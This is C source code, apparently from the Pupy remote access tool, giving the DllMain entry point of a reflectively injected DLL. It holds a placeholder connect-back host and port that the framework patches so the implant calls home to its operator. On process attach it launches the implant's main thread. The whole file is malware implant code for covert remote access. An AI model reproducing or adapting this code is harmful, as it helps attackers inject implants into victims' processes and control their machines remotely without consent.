/*
 *     Author : Nicolas VERDIER
 *
 */
//#pragma comment(lib, "user32")

#include <windows.h>
#include "pupy_load.h"
#include "ReflectiveDllInjection.h"

/* value "<default_connect_back_host>:<default_connect_back_port>" will be searched/replaced by the framework to change pupy connect back IP without recompiling the DLL */
char connect_back_host[100]="<default_connect_back_host>:<default_connect_back_port>"; //big array to have space for big domain names.

extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	HANDLE hThread;
	DWORD threadId;
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
		break;
		case DLL_PROCESS_ATTACH:
					//MessageBoxA(0, "injection ok", "injection ok", MB_OK | MB_ICONINFORMATION);
			hAppInstance = hinstDLL;
			mainThread(NULL);
			hThread = CreateThread(NULL,
					0,		// dwStackSize
					mainThread,	// lpStartAddress
					NULL,		// lpParameter
					0,		// dwCreationFlags (0==run right after creation)
					&threadId
					);
			
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

